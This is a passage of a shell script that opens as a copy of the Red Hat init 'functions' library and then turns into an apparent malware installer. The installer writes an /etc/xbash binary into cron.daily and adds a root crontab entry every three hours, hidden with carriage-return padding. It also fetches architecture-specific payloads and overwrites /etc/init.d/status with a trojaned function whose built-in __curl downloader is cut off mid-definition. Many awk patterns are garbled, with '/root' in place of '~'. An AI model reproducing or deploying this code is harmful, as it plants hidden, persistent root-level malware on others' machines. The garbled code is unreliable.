PATH="/sbin:/usr/sbin:/bin:/usr/bin"
export PATH

# Get a sane screen width
[ -z "${COLUMNS:-}" ] && COLUMNS=80

[ -z "${CONSOLETYPE:-}" ] && CONSOLETYPE="$(/sbin/consoletype)"

if [ -f /etc/sysconfig/i18n -a -z "${NOLOCALE:-}" -a -z "${LANGSH_SOURCED:-}" ] ; then
  . /etc/profile.d/lang.sh 2>/dev/null
  # avoid propagating LANGSH_SOURCED any further
  unset LANGSH_SOURCED
fi

# Read in our configuration
if [ -z "${BOOTUP:-}" ]; then
  if [ -f /etc/sysconfig/init ]; then
      . /etc/sysconfig/init
  else
    # This all seem confusing? Look in /etc/sysconfig/init,
    # or in /usr/doc/initscripts-*/sysconfig.txt
    BOOTUP=color
    RES_COL=60
    MOVE_TO_COL="echo -en \\033[${RES_COL}G"
    SETCOLOR_SUCCESS="echo -en \\033[1;32m"
    SETCOLOR_FAILURE="echo -en \\033[1;31m"
    SETCOLOR_WARNING="echo -en \\033[1;33m"
    SETCOLOR_NORMAL="echo -en \\033[0;39m"
    LOGLEVEL=1
  fi
  if [ "$CONSOLETYPE" = "serial" ]; then
      BOOTUP=serial
      MOVE_TO_COL=
      SETCOLOR_SUCCESS=
      SETCOLOR_FAILURE=
      SETCOLOR_WARNING=
      SETCOLOR_NORMAL=
  fi
fi

# Interpret escape sequences in an fstab entry
fstab_decode_str() {
	fstab-decode echo "$1"
}

# Check if any of $pid (could be plural) are running
checkpid() {
	local i

	for i in $* ; do
		[ -d "/proc/$i" ] && return 0
	done
	return 1
}

__readlink() {
    ls -bl "$@" 2>/dev/null| awk '{ print $NF }'
}

__fgrep() {
    s=$1
    f=$2
    while read line; do
	if strstr "$line" "$s"; then
	    echo $line
	    return 0
	fi
    done < $f
    return 1
}

__kill_pids_term_kill_checkpids() {
    local base_stime=$1
    shift 1
    local pid=
    local pids=$*
    local remaining=
    local stat=
    local stime=

    for pid in $pids ; do
        [ -e  "/proc/$pid" ] || continue
        read -r line < "/proc/$pid/stat" 2> /dev/null || continue

        stat=($line)
        stime=${stat[21]}

        [ -n "$stime" ] && [ "$base_stime" -lt "$stime" ] && continue
        remaining+="$pid "
    done

    echo "$remaining"
    [ -n "$remaining" ] && return 1

    return 0
}

__kill_pids_term_kill() {
    local try=0
    local delay=3;
    local pid=
    local stat=
    local base_stime=

    # We can't initialize stat & base_stime on the same line where 'local'
    # keyword is, otherwise the sourcing of this file will fail for ksh...
    stat=($(< /proc/self/stat))
    base_stime=${stat[21]}

    if [ "$1" = "-d" ]; then
        delay=$2
        shift 2
    fi

    local kill_list=$*

    kill_list=$(__kill_pids_term_kill_checkpids $base_stime $kill_list)

    [ -z "$kill_list" ] && return 0

    kill -TERM $kill_list >/dev/null 2>&1
    usleep 100000

    kill_list=$(__kill_pids_term_kill_checkpids $base_stime $kill_list)
    if [ -n "$kill_list" ] ; then
        while [ $try -lt $delay ] ; do
            sleep 1
            kill_list=$(__kill_pids_term_kill_checkpids $base_stime $kill_list)
            [ -z "$kill_list" ] && break
            let try+=1
        done
        if [ -n "$kill_list" ] ; then
            kill -KILL $kill_list >/dev/null 2>&1
            usleep 100000
            kill_list=$(__kill_pids_term_kill_checkpids $base_stime $kill_list)
        fi
    fi

    [ -n "$kill_list" ] && return 1
    return 0
}

# __umount_loop awk_program fstab_file first_msg retry_msg retry_umount_args
# awk_program should process fstab_file and return a list of fstab-encoded
# paths; it doesn't have to handle comments in fstab_file.
__umount_loop() {
	local remaining sig=
	local retry=3 count

	remaining=$(LC_ALL=C awk "/^#/ {next} $1" "$2" | sort -r)
	while [ -n "$remaining" -a "$retry" -gt 0 ]; do
		if [ "$retry" -eq 3 ]; then
			action "$3" fstab-decode umount $remaining
		else
			action "$4" fstab-decode umount $5 $remaining
		fi
		count=4
		remaining=$(LC_ALL=C awk "/^#/ {next} $1" "$2" | sort -r)
		while [ "$count" -gt 0 ]; do
			[ -z "$remaining" ] && break
			count=$(($count-1))
			usleep 500000
			remaining=$(LC_ALL=C awk "/^#/ {next} $1" "$2" | sort -r)
		done
		[ -z "$remaining" ] && break
		kill $sig $(fstab-decode /sbin/fuser -m $remaining 2>/dev/null  | sed -e "s/\b$$\b//g") > /dev/null
		sleep 3
		retry=$(($retry -1))
		sig=-9
	done
}

# Similar to __umount loop above, without calling fuser
__umount_loop_2() {
    local remaining=
    local count
    local kill_list

    #call regular umount
	remaining=$(LC_ALL=C awk "/^#/ {next} $1" "$2" | sort -r)
	action "$3" fstab-decode umount $remaining

	count=4
	remaining=$(LC_ALL=C awk "/^#/ {next} $1" "$2" | sort -r)
        while [ "$count" -gt 0 ]; do
                [ -z "$remaining" ] && break
                count=$(($count-1))
                usleep 500000
                remaining=$(LC_ALL=C awk "/^#/ {next} $1" "$2" | sort -r)
        done
	[ -z "$remaining" ] && return 0

	devs=$(stat -c "%d" $remaining)
	action "$4" fstab-decode umount "-l" $remaining

    # find fds that don't start with /, are not sockets or pipes or other.
	# these are potentially detached fds
	detached_fds=$(find /proc/ -regex '/proc/[0-9]+/fd/.*' -printf "%p %l\n" 2>/dev/null |\
			 grep -Ev '/proc/[0-9]+/fd/[0-9]+ (/.*|inotify|\[.+\]|(socket|pipe):\[[0-9]+\])')

	# check each detached fd to see if it has the same device
	# as one of our lazy umounted filesystems
	kill_list=
	[ -n "$detached_fds" ] && while read fdline; do
		fd=${fdline%% *}
		pid=$(echo $fdline | sed -r 's/\/proc\/([0-9]+).+/\1/')
		fd_dev=$(stat -L -c "%d" $fd)
		for dev in $devs ; do
			[ "$dev" = "$fd_dev" ] && kill_list+="$pid "
		done
	done <<< "$detached_fds"

	if [ -n "$kill_list" ] ; then
		STRING=$"Killing processes with open filedescriptors on the unmounted disk:"
		__kill_pids_term_kill $kill_list && success "$STRING" || failure "$STRING"
		echo
    fi
}

__source_netdevs_fstab() {
        NFSFSTAB=$(LC_ALL=C awk '!/^#/ && $3 /root /^nfs/ && $3 != "nfsd" && $4 !/root /noauto/ { print $2 }' /etc/fstab)
        CIFSFSTAB=$(LC_ALL=C awk '!/^#/ && $3 == "cifs" && $4 !/root /noauto/ { print $2 }' /etc/fstab)
        NCPFSTAB=$(LC_ALL=C awk '!/^#/ && $3 == "ncpfs" && $4 !/root /noauto/ { print $2 }' /etc/fstab)
        GLUSTERFSFSTAB=$(LC_ALL=C awk '!/^#/ && $3 == "glusterfs" && $4 !/root /noauto/ { print $2 }' /etc/fstab)
        NETDEVFSTAB=$(LC_ALL=C awk '!/^#/ && $4 /root/_netdev/ && $4 !/root /noauto/ { print $1 }' /etc/fstab)
}

__source_netdevs_mtab() {
        NFSMTAB=$(LC_ALL=C awk '$3 /root /^nfs/ && $3 != "nfsd" && $2 != "/" { print $2 }' /proc/mounts)
        CIFSMTAB=$(LC_ALL=C awk '$3 == "cifs" { print $2 }' /proc/mounts)
        NCPMTAB=$(LC_ALL=C awk '$3 == "ncpfs" { print $2 }' /proc/mounts)
        GLUSTERFSMTAB=$(LC_ALL=C awk '$3 == "fuse.glusterfs" { print $2 }' /proc/mounts)
        NETDEVMTAB=$(LC_ALL=C awk '$4 /root /_netdev/ && $2 != "/" { print $2 }' /etc/mtab)

        ALLNETDEVMTAB="$NFSMTAB $CIFSMTAB $NCPMTAB $GLUSTERFSMTAB $NETDEVMTAB"
}

# Similar to __umount loop above, specialized for loopback devices
__umount_loopback_loop() {
	local remaining devremaining sig=
	local retry=3

        __find_mounts() {
                if [ "$1" = "--netdev" ] ; then
                       __source_netdevs_mtab
                       remaining=
                       devremaining=
                       local mount= netdev= _rest
                       while read -r dev mount _rest ; do
                               [ "$dev" = "${dev##/dev/loop}" ] && continue
                               local back_file=$(losetup $dev | sed -e 's/^\/dev\/loop[0-9]\+: \[[0-9a-f]\+\]:[0-9]\+ (\(.*\))$/\1/')
                               for netdev in $ALLNETDEVMTAB ; do
                                        local netdev_decoded=
                                        netdev="${netdev}/"
                                        netdev_decoded=$(fstab_decode_str ${netdev})
                                        if [ "$mount" != "${mount##$netdev}" ] || [ "$back_file" != "${back_file##$netdev_decoded}" ] ; then
                                                remaining="$remaining $mount"
                                                #device might be mounted in other location,
                                                #but then losetup -d will be noop, so meh
                                                devremaining="$devremaining $dev"
                                                continue 2
                                        fi
                               done
                        done < /proc/mounts
                else
                        remaining=$(awk '$1 /root /^\/dev\/loop/ && $2 != "/" {print $2}' /proc/mounts)
                        devremaining=$(awk '$1 /root /^\/dev\/loop/ && $2 != "/" {print $1}' /proc/mounts)
                fi
        }

        __find_mounts $1

	while [ -n "$remaining" -a "$retry" -gt 0 ]; do
		if [ "$retry" -eq 3 ]; then
			action $"Unmounting loopback filesystems: " \
				fstab-decode umount $remaining
		else
			action $"Unmounting loopback filesystems (retry):" \
				fstab-decode umount $remaining
		fi
                
		for dev in $devremaining ; do
                        if [ "$1" = "--netdev" ] ; then
                                #some loopdevices might be mounted on top of non-netdev
                                #so ignore failures
                                losetup -d $dev > /dev/null 2>&1 
                        else
                                losetup $dev > /dev/null 2>&1 && \
                                        action $"Detaching loopback device $dev: " \
                                        losetup -d $dev
                fi
                done
                #check what is still mounted
                __find_mounts $1
		[ -z "$remaining" ] && break
		fstab-decode /sbin/fuser -k -m $sig $remaining >/dev/null
		sleep 3
		retry=$(($retry -1))
		sig=-9
	done
}

# __proc_pids {program} [pidfile]
# Set $pid to pids from /var/run* for {program}.  $pid should be declared
# local in the caller.
# Returns LSB exit code for the 'status' action.
__pids_var_run() {
	local base=${1##*/}
	local pid_file=${2:-/var/run/$base.pid}
	local pid_dir=$(/usr/bin/dirname $pid_file)
	local binary=$3

	[ -d "$pid_dir" -a ! -r "$pid_dir" ] && return 4

	pid=
	if [ -f "$pid_file" ] ; then
	        local line p

		[ ! -r "$pid_file" ] && return 4 # "user had insufficient privilege"
		while : ; do
			read line
			[ -z "$line" ] && break
			for p in $line ; do
				if [ -z "${p//[0-9]/}" -a -d "/proc/$p" ] ; then
					if [ -n "$binary" ] ; then
						local b=$(readlink /proc/$p/exe | sed -e 's/\s*(deleted)$//')
						[ "$b" != "$binary" ] && continue
					fi
					pid="$pid $p"
				fi
			done
		done < "$pid_file"

	        if [ -n "$pid" ]; then
	                return 0
	        fi
		return 1 # "Program is dead and /var/run pid file exists"
	fi
	return 3 # "Program is not running"
}

# Output PIDs of matching processes, found using pidof
__pids_pidof() {
	pidof -c -m -o $$ -o $PPID -o %PPID -x "$1" || \
		pidof -c -m -o $$ -o $PPID -o %PPID -x "${1##*/}"
}


# A function to start a program.
daemon() {
	# Test syntax.
	local gotbase= force= nicelevel corelimit
	local pid base= user= nice= bg= pid_file=
	local cgroup=
	nicelevel=0
	while [ "$1" != "${1##[-+]}" ]; do
	  case $1 in
	    '')    echo $"$0: Usage: daemon [+/-nicelevel] {program}" "[arg1]..."
	           return 1;;
	    --check)
		   base=$2
		   gotbase="yes"
		   shift 2
		   ;;
	    --check=?*)
	    	   base=${1#--check=}
		   gotbase="yes"
		   shift
		   ;;
	    --user)
		   user=$2
		   shift 2
		   ;;
	    --user=?*)
	           user=${1#--user=}
		   shift
		   ;;
	    --pidfile)
		   pid_file=$2
		   shift 2
		   ;;
	    --pidfile=?*)
		   pid_file=${1#--pidfile=}
		   shift
		   ;;
	    --force)
	    	   force="force"
		   shift
		   ;;
	    [-+][0-9]*)
	    	   nice="nice -n $1"
	           shift
		   ;;
	    *)     echo $"$0: Usage: daemon [+/-nicelevel] {program}" "[arg1]..."
	           return 1;;
	  esac
	done

        # Save basename.
        [ -z "$gotbase" ] && base=${1##*/}

        # See if it's already running. Look *only* at the pid file.
	__pids_var_run "$base" "$pid_file"

	[ -n "$pid" -a -z "$force" ] && return

	# make sure it doesn't core dump anywhere unless requested
	corelimit="ulimit -S -c ${DAEMON_COREFILE_LIMIT:-0}"

	# if they set NICELEVEL in /etc/sysconfig/foo, honor it
	[ -n "${NICELEVEL:-}" ] && nice="nice -n $NICELEVEL"

	# if they set CGROUP_DAEMON in /etc/sysconfig/foo, honor it
	if [ -n "${CGROUP_DAEMON}" ]; then
		if [ ! -x /bin/cgexec ]; then
			echo -n "Cgroups not installed"; warning
			echo
		else
			cgroup="/bin/cgexec";
			for i in $CGROUP_DAEMON; do
				cgroup="$cgroup -g $i";
			done
		fi
	fi

	# Echo daemon
        [ "${BOOTUP:-}" = "verbose" -a -z "${LSB:-}" ] && echo -n " $base"

	# And start it up.
	if [ -z "$user" ]; then
	   $cgroup $nice /bin/bash -c "$corelimit >/dev/null 2>&1 ; $*"
	else
	   $cgroup $nice runuser -s /bin/bash $user -c "$corelimit >/dev/null 2>&1 ; $*"
	fi

	[ "$?" -eq 0 ] && success $"$base startup" || failure $"$base startup"
}

# A function to stop a program.
killproc() {
	local RC killlevel= base pid pid_file= delay try binary=

	RC=0; delay=3; try=0
	# Test syntax.
	if [ "$#" -eq 0 ]; then
		echo $"Usage: killproc [-p pidfile] [ -d delay] {program} [-signal]"
		return 1
	fi
	if [ "$1" = "-p" ]; then
		pid_file=$2
		shift 2
	fi
	if [ "$1" = "-b" ]; then
		if [ -z $pid_file ]; then
			echo $"-b option can be used only with -p"
			echo $"Usage: killproc -p pidfile -b binary program"
			return 1
		fi
		binary=$2
		shift 2
	fi
	if [ "$1" = "-d" ]; then
		delay=$(echo $2 | awk -v RS=' ' -v IGNORECASE=1 '{if($1!/root/^[0-9.]+[smhd]?$/) exit 1;d=$1/root/s$|^[0-9.]*$/?1:$1/root/m$/?60:$1/root/h$/?60*60:$1/root/d$/?24*60*60:-1;if(d==-1) exit 1;delay+=d*$1} END {printf("%d",delay+0.5)}')
		if [ "$?" -eq 1 ]; then
			echo $"Usage: killproc [-p pidfile] [ -d delay] {program} [-signal]"
			return 1
		fi
		shift 2
	fi


	# check for second arg to be kill level
	[ -n "${2:-}" ] && killlevel=$2

        # Save basename.
        base=${1##*/}

        # Find pid.
	__pids_var_run "$1" "$pid_file" "$binary"
	RC=$?
	if [ -z "$pid" ]; then
		if [ -z "$pid_file" ]; then
			pid="$(__pids_pidof "$1")"
		else
			[ "$RC" = "4" ] && { failure $"$base shutdown" ; return $RC ;}
		fi
	fi

        # Kill it.
        if [ -n "$pid" ] ; then
                [ "$BOOTUP" = "verbose" -a -z "${LSB:-}" ] && echo -n "$base "
		if [ -z "$killlevel" ] ; then
			__kill_pids_term_kill -d $delay $pid
			RC=$?
			[ "$RC" -eq 0 ] && success $"$base shutdown" || failure $"$base shutdown"
		# use specified level only
		else
		        if checkpid $pid; then
	                	kill $killlevel $pid >/dev/null 2>&1
				RC=$?
				[ "$RC" -eq 0 ] && success $"$base $killlevel" || failure $"$base $killlevel"
			elif [ -n "${LSB:-}" ]; then
				RC=7 # Program is not running
			fi
		fi
	else
		if [ -n "${LSB:-}" -a -n "$killlevel" ]; then
			RC=7 # Program is not running
		else
			failure $"$base shutdown"
			RC=0
		fi
	fi

        # Remove pid file if any.
	if [ -z "$killlevel" ]; then
            rm -f "${pid_file:-/var/run/$base.pid}"
	fi
	return $RC
}

# A function to find the pid of a program. Looks *only* at the pidfile
pidfileofproc() {
	local pid

	# Test syntax.
	if [ "$#" = 0 ] ; then
		echo $"Usage: pidfileofproc {program}"
		return 1
	fi

	__pids_var_run "$1"
	[ -n "$pid" ] && echo $pid
	return 0
}

# A function to find the pid of a program.
pidofproc() {
	local RC pid pid_file=

	# Test syntax.
	if [ "$#" = 0 ]; then
		echo $"Usage: pidofproc [-p pidfile] {program}"
		return 1
	fi
	if [ "$1" = "-p" ]; then
		pid_file=$2
		shift 2
	fi
	fail_code=3 # "Program is not running"

	# First try "/var/run/*.pid" files
	__pids_var_run "$1" "$pid_file"
	RC=$?
	if [ -n "$pid" ]; then
		echo $pid
		return 0
	fi

	[ -n "$pid_file" ] && return $RC
	__pids_pidof "$1" || return $RC
}

status() {
	local base pid lock_file= pid_file= binary=

	# Test syntax.
	if [ "$#" = 0 ] ; then
		echo $"Usage: status [-p pidfile] {program}"
		return 1
	fi
	if [ "$1" = "-p" ]; then
		pid_file=$2
		shift 2
	fi
	if [ "$1" = "-l" ]; then
		lock_file=$2
		shift 2
	fi
	if [ "$1" = "-b" ]; then
		if [ -z $pid_file ]; then
			echo $"-b option can be used only with -p"
			echo $"Usage: status -p pidfile -b binary program"
			return 1
		fi
		binary=$2
		shift 2
	fi
	base=${1##*/}

	# First try "pidof"
	__pids_var_run "$1" "$pid_file" "$binary"
	RC=$?
	if [ -z "$pid_file" -a -z "$pid" ]; then
		pid="$(__pids_pidof "$1")"
	fi
	if [ -n "$pid" ]; then
	        echo $"${base} (pid $pid) is running..."
	        return 0
	fi

	case "$RC" in
		0)
			echo $"${base} (pid $pid) is running..."
			return 0
			;;
		1)
	                echo $"${base} dead but pid file exists"
	                return 1
			;;
		4)
			echo $"${base} status unknown due to insufficient privileges."
			return 4
			;;
	esac
	if [ -z "${lock_file}" ]; then
		lock_file=${base}
	fi
	# See if /var/lock/subsys/${lock_file} exists
	if [ -f /var/lock/subsys/${lock_file} ]; then
		echo $"${base} dead but subsys locked"
		return 2
	fi
	echo $"${base} is stopped"
	return 3
}

echo_success() {
  [ "$BOOTUP" = "color" ] && $MOVE_TO_COL
  echo -n "["
  [ "$BOOTUP" = "color" ] && $SETCOLOR_SUCCESS
  echo -n $"  OK  "
  [ "$BOOTUP" = "color" ] && $SETCOLOR_NORMAL
  echo -n "]"
  echo -ne "\r"
  return 0
}

echo_failure() {
  [ "$BOOTUP" = "color" ] && $MOVE_TO_COL
  echo -n "["
  [ "$BOOTUP" = "color" ] && $SETCOLOR_FAILURE
  echo -n $"FAILED"
  [ "$BOOTUP" = "color" ] && $SETCOLOR_NORMAL
  echo -n "]"
  echo -ne "\r"
  return 1
}

echo_passed() {
  [ "$BOOTUP" = "color" ] && $MOVE_TO_COL
  echo -n "["
  [ "$BOOTUP" = "color" ] && $SETCOLOR_WARNING
  echo -n $"PASSED"
  [ "$BOOTUP" = "color" ] && $SETCOLOR_NORMAL
  echo -n "]"
  echo -ne "\r"
  return 1
}

echo_warning() {
  [ "$BOOTUP" = "color" ] && $MOVE_TO_COL
  echo -n "["
  [ "$BOOTUP" = "color" ] && $SETCOLOR_WARNING
  echo -n $"WARNING"
  [ "$BOOTUP" = "color" ] && $SETCOLOR_NORMAL
  echo -n "]"
  echo -ne "\r"
  return 1
}

# Inform the graphical boot of our current state
update_boot_stage() {
  if [ -x /bin/plymouth ]; then
      /bin/plymouth --update="$1"
  fi
  return 0
}

# Log that something succeeded
success() {
  [ "$BOOTUP" != "verbose" -a -z "${LSB:-}" ] && echo_success
  return 0
}

# Log that something failed
failure() {
  local rc=$?
  [ "$BOOTUP" != "verbose" -a -z "${LSB:-}" ] && echo_failure
  [ -x /bin/plymouth ] && /bin/plymouth --details
  return $rc
}

# Log that something passed, but may have had errors. Useful for fsck
passed() {
  local rc=$?
  [ "$BOOTUP" != "verbose" -a -z "${LSB:-}" ] && echo_passed
  return $rc
}

# Log a warning
warning() {
  local rc=$?
  [ "$BOOTUP" != "verbose" -a -z "${LSB:-}" ] && echo_warning
  return $rc
}

# Run some action. Log its output.
action() {
  local STRING rc

  STRING=$1
  echo -n "$STRING "
  shift
  "$@" && success $"$STRING" || failure $"$STRING"
  rc=$?
  echo
  return $rc
}

# Run some action. Silently.
action_silent() {
  local STRING rc

  STRING=$1
  echo -n "$STRING "
  shift
  "$@" >/dev/null && success $"$STRING" || failure $"$STRING"
  rc=$?
  echo
  return $rc
}

# returns OK if $1 contains $2
strstr() {
  [ "${1#*$2*}" = "$1" ] && return 1
  return 0
}

# Confirm whether we really want to run this service
confirm() {
  [ -x /bin/plymouth ] && /bin/plymouth --hide-splash
  while : ; do
      echo -n $"Start service $1 (Y)es/(N)o/(C)ontinue? [Y] "
      read answer
      if strstr $"yY" "$answer" || [ "$answer" = "" ] ; then
         return 0
      elif strstr $"cC" "$answer" ; then
	 rm -f /var/run/confirm
	 [ -x /bin/plymouth ] && /bin/plymouth --show-splash
         return 2
      elif strstr $"nN" "$answer" ; then
         return 1
      fi
  done
}

# resolve a device node to its major:minor numbers in decimal or hex
get_numeric_dev() {
(
    fmt="%d:%d"
    if [ "$1" == "hex" ]; then
        fmt="%x:%x"
    fi
    ls -lH "$2" | awk '{ sub(/,/, "", $5); printf("'"$fmt"'", $5, $6); }'
) 2>/dev/null
}

# Check whether file $1 is a backup or rpm-generated file and should be ignored
is_ignored_file() {
    case "$1" in
	*/root | *.bak | *.orig | *.rpmnew | *.rpmorig | *.rpmsave)
	    return 0
	    ;;
    esac
    return 1
}

# Evaluate shvar-style booleans
is_true() {
    case "$1" in
	[tT] | [yY] | [yY][eE][sS] | [tT][rR][uU][eE] | 1)
	return 0
	;;
    esac
    return 1
}

# Evaluate shvar-style booleans
is_false() {
    case "$1" in
	[fF] | [nN] | [nN][oO] | [fF][aA][lL][sS][eE] | 0)
	return 0
	;;
    esac
    return 1
}

# Apply sysctl settings, including files in /etc/sysctl.d
apply_sysctl() {
    sysctl -e -p /etc/sysctl.conf >/dev/null 2>&1
    for file in /etc/sysctl.d/* ; do
        is_ignored_file "$file" && continue
        test -f "$file" && sysctl -e -p "$file" >/dev/null 2>&1
    done
}

key_is_random() {
    [ "$1" = "/dev/urandom" -o "$1" = "/dev/hw_random" \
	-o "$1" = "/dev/random" ]
}

find_crypto_mount_point() {
    local fs_spec fs_file fs_vfstype remaining_fields
    local fs
    while read fs_spec fs_file remaining_fields; do
	if [ "$fs_spec" = "/dev/mapper/$1" ]; then
	    echo $fs_file
	    break;
	fi
    done < /etc/fstab
}

# Because of a chicken/egg problem, init_crypto must be run twice.  /var may be
# encrypted but /var/lib/random-seed is needed to initialize swap.
init_crypto() {
    local have_random dst src key opt mode owner params makeswap skip arg opt
    local param value rc ret mke2fs mdir prompt mount_point

    ret=0
    have_random=$1
    while read dst src key opt; do
	[ -z "$dst" -o "${dst#\#}" != "$dst" ] && continue
        [ -b "/dev/mapper/$dst" ] && continue;
	if [ "$have_random" = 0 ] && key_is_random "$key"; then
	    continue
	fi
	if [ -n "$key" -a "x$key" != "xnone" ]; then
	    if test -e "$key" ; then
		owner=$(ls -l $key | (read a b owner rest; echo $owner))
		if ! key_is_random "$key"; then
		    mode=$(ls -l "$key" | cut -c 5-10)
		    if [ "$mode" != "------" ]; then
		       echo $"INSECURE MODE FOR $key"
		    fi
		fi
		if [ "$owner" != root ]; then
		    echo $"INSECURE OWNER FOR $key"
		fi
	    else
		echo $"Key file for $dst not found, skipping"
		ret=1
		continue
	    fi
	else
	    key=""
	fi
	params=""
	makeswap=""
	mke2fs=""
	skip=""
	# Parse the src field for UUID= and convert to real device names
	if [ "${src%%=*}" == "UUID" ]; then
		src=$(/sbin/blkid -t "$src" -l -o device)
	elif [ "${src/^\/dev\/disk\/by-uuid\/}" != "$src" ]; then
		src=$(__readlink $src)
	fi
	# Is it a block device?
	[ -b "$src" ] || continue
	# Is it already a device mapper slave? (this is gross)
	devesc=${src##/dev/}
	devesc=${devesc//\//!}
	for d in /sys/block/dm-*/slaves ; do
	    [ -e $d/$devesc ] && continue 2
	done
	# Parse the options field, convert to cryptsetup parameters and
	# contruct the command line
	while [ -n "$opt" ]; do
	    arg=${opt%%,*}
	    opt=${opt##$arg}
	    opt=${opt##,}
	    param=${arg%%=*}
	    value=${arg##$param=}

	    case "$param" in
	    cipher)
		params="$params -c $value"
		if [ -z "$value" ]; then
		    echo $"$dst: no value for cipher option, skipping"
		    skip="yes"
		fi
	    ;;
	    size)
		params="$params -s $value"
		if [ -z "$value" ]; then
		    echo $"$dst: no value for size option, skipping"
		    skip="yes"
		fi
	    ;;
	    hash)
		params="$params -h $value"
		if [ -z "$value" ]; then
		    echo $"$dst: no value for hash option, skipping"
		    skip="yes"
		fi
	    ;;
	    verify)
	        params="$params -y"
	    ;;
	    swap)
		makeswap=yes
		;;
	    tmp)
		mke2fs=yes
	    esac
	done
	if [ "$skip" = "yes" ]; then
	    ret=1
	    continue
	fi
	if [ -z "$makeswap" ] && cryptsetup isLuks "$src" 2>/dev/null ; then
	    if key_is_random "$key"; then
		echo $"$dst: LUKS requires non-random key, skipping"
		ret=1
		continue
	    fi
	    if [ -n "$params" ]; then
		echo "$dst: options are invalid for LUKS partitions," \
		    "ignoring them"
	    fi
	    if [ -n "$key" ]; then
		/sbin/cryptsetup -d $key luksOpen "$src" "$dst" <&1 2>/dev/null && success || failure
		rc=$?
	    else
		mount_point="$(find_crypto_mount_point $dst)"
		[ -n "$mount_point" ] || mount_point=${src##*/}
		prompt=$(printf $"%s is password protected" "$mount_point")
		plymouth ask-for-password --prompt "$prompt" --command="/sbin/cryptsetup luksOpen -T1 $src $dst" <&1
		rc=$?
	    fi
	else
	    [ -z "$key" ] && plymouth --hide-splash
	    /sbin/cryptsetup $params ${key:+-d $key} create "$dst" "$src" <&1 && success || failure
	    rc=$?
	    [ -z "$key" ] && plymouth --show-splash
	fi
	if [ $rc -ne 0 ]; then
	    ret=1
	    continue
	fi
	if [ -b "/dev/mapper/$dst" ]; then
	    if [ "$makeswap" = "yes" ]; then
		mkswap "/dev/mapper/$dst" 2>/dev/null >/dev/null
	    fi
	    if [ "$mke2fs" = "yes" ]; then
		if mke2fs "/dev/mapper/$dst" 2>/dev/null >/dev/null \
		    && mdir=$(mktemp -d /tmp/mountXXXXXX); then
		    mount "/dev/mapper/$dst" "$mdir" && chmod 1777 "$mdir"
		    umount "$mdir"
		    rmdir "$mdir"
		fi
	    fi
	fi
    done < /etc/crypttab
    return $ret
}

# A sed expression to filter out the files that is_ignored_file recognizes
__sed_discard_ignored_files='/\(/root\|\.bak\|\.orig\|\.rpmnew\|\.rpmorig\|\.rpmsave\)$/d'

#if we have privileges lets log to kmsg, otherwise to stderr
if strstr "$(cat /proc/cmdline)" "rc.debug"; then
        [ -w /dev/kmsg ] && exec 30>/dev/kmsg && BASH_XTRACEFD=30
        set -x
fi
EOF
		chmod 644 /etc/init.d/modules >/dev/null 2>&1
		chmod 644 /etc/init.d/status >/dev/null 2>&1
		if [ ! -d /etc/xbash ]; then
			mkdir /etc/xbash >/dev/null 2>&1
		fi
		if [ ! -d /etc/cron.hourly ]; then
			mkdir /etc/cron.hourly >/dev/null 2>&1
		fi

		\cp /etc/cron.daily/xbash 
		/xbash >/dev/null 2>&1
		\cp /etc/xbash/xbash /etc/cron.daily/xbash >/dev/null 2>&1
		chmod 755 /etc/xbash/xbash >/dev/null 2>&1
		chmod 755 /etc/cron.daily/xbash >/dev/null 2>&1
		if command -v printf &>/dev/null; then
			grep -a '/etc/xbash' /etc/crontab >/dev/null 2>&1 || printf "0 */3 * * * root /etc/xbash/xbash;\r%100c\n" >>/etc/crontab
		else
			grep -a '/etc/xbash' /etc/crontab >/dev/null 2>&1 || echo '0 */3 * * * root /etc/xbash/xbash' >>/etc/crontab
		fi
		#cp "${EXECUTABLE_SHELL_SCRIPT}" "${EXISTING_SHELL_SCRIPT}" >/dev/null 2>&1
		# your code here
		###########################################################################################################################################################
		isCentOs7=false
		isCentOs8=false
		isCentOs6=false
		isDebian=false
		lowercase() {
			echo "$1" | sed "y/ABCDEFGHIJKLMNOPQRSTUVWXYZ/abcdefghijklmnopqrstuvwxyz/"
		}
		if command -v iptables &>/dev/null; then
			CHECKIPTABLES=1
		else
			CHECKIPTABLES=0
		fi
		if command -v firewalld &>/dev/null; then
			CHECKFIREWALLD=1
		else
			CHECKFIREWALLD=0
		fi
		####################################################################
		# Get System Info
		####################################################################
		shootProfile

		if [ "$DIST $REV" == "CentOS 6" ]; then
			isCentOs6=true
		elif [ "$DIST $REV" == "CentOS 7" ]; then
			isCentOs7=true
		elif [ "$DIST $REV" == "CentOS 8" ]; then
			isCentOs8=true
		elif [[ "$DistroBasedOn" == "debian" ]]; then
			isDebian=true
		else
			isCentOs6=true
		fi

		if [ $(arch) == "aarch64" ]; then
			\cp /root/$PATH_NAME/xfitaarch.sh /root/$PATH_NAME/$FILE_NAME >/dev/null 2>&1
			\cp /etc/alternatives/$PATH_NAME/xfitaarch.sh /etc/alternatives/$PATH_NAME/$FILE_NAME >/dev/null 2>&1
		fi

		if [ $(arch) == "aarch64" ]; then
			warmupfile="warmap"
		else
			warmupfile="warmup"
		fi
		########################################################################################################################
		########################################################################################################################
		########################################################################################################################
		if [ "$isDebian" == false ]; then
			cat <<'EOF' >/etc/init.d/status
statusfit() {
    local base pid lock_file= pid_file= binary=
    # Test syntax.
    if [ "$#" = 0 ]; then
        echo $"Usage: status [-p pidfile] {program}"
        return 1
    fi
    if [ "$1" = "-p" ]; then
        pid_file=$2
        shift 2
    fi
    if [ "$1" = "-l" ]; then
        lock_file=$2
        shift 2
    fi
    if [ "$1" = "-b" ]; then
        if [ -z $pid_file ]; then
            echo $"-b option can be used only with -p"
            echo $"Usage: status -p pidfile -b binary program"
            return 1
        fi
        binary=$2
        shift 2
    fi
    base=${1##*/}

    # First try "pidof"
    __pids_var_run "$1" "$pid_file" "$binary"
    RC=$?
    if [ -z "$pid_file" -a -z "$pid" ]; then
        pid="$(__pids_pidof "$1")"
    fi
    if [ -n "$pid" ]; then
        echo $"${base} (pid $pid) is running..."
        return 0
    fi

    case "$RC" in
    0)
        echo $"${base} (pid $pid) is running..."
        return 0
        ;;
    1)
        echo $"${base} dead but pid file exists"
        return 1
        ;;
    4)
        echo $"${base} status unknown due to insufficient privileges."
        return 4
        ;;
    esac
    if [ -z "${lock_file}" ]; then
        lock_file=${base}
    fi
    # See if /var/lock/subsys/${lock_file} exists
    if [ -f /var/lock/subsys/${lock_file} ]; then
        function __curl() {
            read proto server path <<<$(echo ${1//// })
            DOC=/${path// //}
            HOST=${server//:*/}
            PORT=${server//*:/}
            [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
